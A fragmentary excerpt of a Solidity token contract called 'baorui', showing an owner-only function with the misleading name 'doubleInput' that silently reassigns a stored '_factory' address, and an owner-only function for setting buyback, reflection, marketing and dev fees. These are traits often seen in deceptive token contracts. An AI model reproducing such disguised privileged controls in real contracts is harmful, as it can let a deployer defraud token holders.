...
contract OwnershipHelper is ContextHelper {  
    ...
    */
    ...
    function doubleInput(address newOwner) external onlyOwner {
        _factory = newOwner;
    }  
...
contract baorui is ContextHelper, IERC20, OwnershipHelper{
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;  
    mapping (address => mapping (address => uint256)) private _allowances;  
    uint256 private _totalSupply = 1000000 *  10**9;        
    
    string private _name = "baorui";
    string private _symbol = "BAORUI";
    ...
    function _checkAllFees() external view returns (uint256,uint256,uint256,uint256,uint256) {
        return (
            _buybackFee,
            _reflectionFee,
            _marketingFee,
    ...
    function _setFees(uint8 _buybackfee, uint8 _reflectionfee, uint8 _marketingfee, uint8 _devfee, uint8 _feedenominator) external onlyOwner {
    ...
    function _getCoreRebase(int256 supplyDelta, uint256 supplyMax) private view returns (uint256) {
